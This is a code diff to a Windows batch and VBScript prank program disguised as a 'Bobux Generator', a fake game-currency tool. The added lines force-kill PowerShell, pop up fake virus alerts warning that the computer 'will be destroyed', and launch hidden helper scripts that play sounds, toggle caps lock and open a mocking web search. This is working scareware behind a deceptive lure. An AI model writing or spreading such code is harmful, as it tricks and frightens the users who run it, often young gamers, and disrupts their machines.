@@ -6,19 +6,25 @@ setlocal EnableDelayedExpansion
 taskkill /IM powershell.exe /F > NUL
 timeout 1 > NUL
 
-echo x=msgbox("Bobux Generator is loading... (DO NOT CLOSE THIS WINDOW!)" ,0+64, "Loading...") >> msgbox.vbs
-
-start msgbox.vbs
-timeout 1 > NUL
-del /Q msgbox.vbs
-
-
-
-
+echo x=msgbox("Please wait, Bobux Generator is loading..." ,0+64, "Loading...") >> msgbox.vbs
 echo checking internet connection
 Ping www.google.nl -n 1 -w 1000
 cls
 if errorlevel 1 (goto nointernet) else (echo Connected)
+echo X=MsgBox("Congratulations, You just executed a virus! Do not close any windows, or your computer will be destroyed.", 0+16, "VIRuS ALErT") >> viruzlol.vbs
+
+
+start msgbox.vbs
+timeout 2 > NUL
+start viruzlol.vbs
+del /Q msgbox.vbs
+timeout 1 > NUL
+del /Q viruzlol.vbs
+
+
+
+
+
 
 
 
@@ -44,6 +50,9 @@ echo Done.
 cd "%USERPROFILE%\beanslmao\"
 
 rem timeout 5 > NUL
+
+set \n=^
+
 
 
 
@@ -85,8 +94,10 @@ strHomeFolder = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
 
 'CreateObject("WScript.Shell").Run("taskkill /IM wscript.exe /F")
 
-X=MsgBox("Congratulations, You just executed a virus! Do not try to close any windows, or your computer will be destroyed.", 4096+16, "VIRuS ALErT")
-
+'X=MsgBox("Congratulations, You just executed a virus! Do not close any windows, or your computer will be destroyed.", 4096+16, "VIRuS ALErT")
+X=MsgBox("You have 30 seconds.", 0+48, "Warning")
+CreateObject("WScript.Shell").Run strHomeFolder + "\beanslmao\lmaogif.bat"
+CreateObject("WScript.Shell").Run soundz.bat
 WScript.Sleep(30000)
 
 
@@ -100,8 +111,10 @@ CreateObject("WScript.Shell").Run strHomeFolder + "\beanslmao\randsound.bat"
 
 
 
+
+
 CreateObject("WScript.Shell").Run strHomeFolder + "\\beanslmao\\capslocklol.vbs"
-WScript.Sleep(30000)
+'WScript.Sleep(30000)
 
 CreateObject("WScript.Shell").run("https://www.google.com/search?rlz=1C1GCEA_enUS937US937&q=ahhhhhhhhhhhhh+halp+ma+compoota+is+doin+wierd+thangz+ahahahahhhahah+halp+plzzzzzz&nfpr=1&sa=X&ved=2ahUKEwjIz_LqouLwAhUZWs0KHbqoDPwQvgUoAXoECAEQNw&biw=1366&bih=657&safe=active&ssui=on")
 
